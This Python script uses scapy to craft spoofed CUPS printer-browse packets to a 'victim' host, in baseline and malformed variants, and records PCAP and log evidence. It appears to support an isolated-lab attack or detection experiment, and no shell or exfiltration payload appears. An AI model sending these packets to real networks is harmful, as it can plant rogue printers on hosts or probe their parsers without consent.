#!/usr/bin/env python3
"""Craft legacy CUPS printer-discovery advertisements for an isolated lab."""

from __future__ import annotations

import argparse
import logging
import time
from pathlib import Path

from scapy.all import IP, Raw, UDP, Packet, wrpcap, send 

LOG = logging.getLogger("cups_attack")


def build_advertisement(
    source_ip: str,
    destination_ip: str,
    printer_ip: str,
    printer_port: int = 631,
    printer_name: str = "Lab Printer",
    queue: str = "printers/lab",
    message_type: int = 0,
) -> Packet:
    """Build a CUPS browse packet using the historical space-delimited format."""
    uri = f"ipp://{printer_ip}:{printer_port}/{queue.lstrip('/')}"
    payload = f"{message_type} 3 {uri} \"{printer_name}\" \"{printer_name}\""
    return IP(src=source_ip, dst=destination_ip) / UDP(sport=631, dport=631) / Raw(
        load=payload.encode("ascii")
    )


def build_variation(name: str, **kwargs: object) -> Packet:
    """Build one of the reproducible manipulation cases used by the experiment."""
    packet = build_advertisement(**kwargs)
    if name == "missing-uri":
        packet[Raw].load = b'0 3 "Lab Printer"'
    elif name == "invalid-port":
        packet[Raw].load = packet[Raw].load.replace(b":631/", b":99999/")
    elif name == "malformed-fields":
        packet[Raw].load = b"not-a-browse-message"
    elif name != "baseline":
        raise ValueError(f"unknown variation: {name}")
    return packet


def write_log(path: Path, packet: Packet, variation: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write(
            f"variation={variation} src={packet[IP].src} dst={packet[IP].dst} "
            f"payload={packet[Raw].load.decode('ascii', errors='replace')}\n"
        )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--victim-ip", default="172.28.77.20")
    parser.add_argument("--advertiser-ip", default="172.28.77.40")
    parser.add_argument("--printer-ip", default="172.28.77.40")
    parser.add_argument("--printer-port", type=int, default=631)
    parser.add_argument("--printer-name", default="Lab Printer")
    parser.add_argument("--queue", default="printers/lab")
    parser.add_argument(
        "--variation",
        choices=("baseline", "missing-uri", "invalid-port", "malformed-fields"),
        default="baseline",
    )
    parser.add_argument("--repeat", type=int, default=1)
    parser.add_argument("--interval", type=float, default=0.0)
    parser.add_argument("--pcap", type=Path, default=Path("pcap_files/attacks/attack.pcap"))
    parser.add_argument("--log", type=Path, default=Path("evidence/logs/attack.log"))
    parser.add_argument("--dry-run", action="store_true", help="write the PCAP without transmitting")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.repeat < 1:
        raise SystemExit("--repeat must be at least 1")
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")
    packets = [
        build_variation(
            args.variation,
            source_ip=args.advertiser_ip,
            destination_ip=args.victim_ip,
            printer_ip=args.printer_ip,
            printer_port=args.printer_port,
            printer_name=args.printer_name,
            queue=args.queue,
        )
        for _ in range(args.repeat)
    ]
    args.pcap.parent.mkdir(parents=True, exist_ok=True)
    wrpcap(str(args.pcap), packets)
    for packet in packets:
        write_log(args.log, packet, args.variation)
    if not args.dry_run:
        for packet in packets:
            LOG.info("sending browse advertisement to %s", args.victim_ip)
            send(packet, verbose=False)
            if args.interval:
                time.sleep(args.interval)
    LOG.info("wrote %d packet(s) to %s", len(packets), args.pcap)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
